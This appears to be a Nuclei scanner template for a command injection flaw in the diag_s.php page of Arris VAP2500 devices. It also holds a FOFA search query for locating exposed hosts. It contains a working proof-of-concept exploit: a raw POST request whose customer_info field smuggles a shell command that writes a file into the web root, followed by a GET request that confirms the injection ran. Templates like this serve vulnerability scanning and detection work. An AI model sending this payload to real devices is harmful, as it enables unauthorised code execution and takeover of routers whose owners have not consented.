id: arris-vap2500-diag_s-php-command-injection

info:
  name: "Arris VAP2500 diag_s.php 命令注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="CACHE-CONTROL" && body="/js/cookiecontrol.js"
    Arris VAP2500 diag_s 存在命令注入漏洞 diag_s.php处存在命令注入漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
  tags: Arris

flow: http(1) && http(2) 

http:
- raw:
  - |
    POST /diag_s.php HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Accept-Encoding: gzip, deflate

    action=1&customer_info=;echo NdayTest > /var/www/Ntest.txt;
- raw:
  - |
    GET /Ntest.txt HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
    - type: status
      status: [200]
    - type: word
      part: body
      words:
      - 'NdayTest'
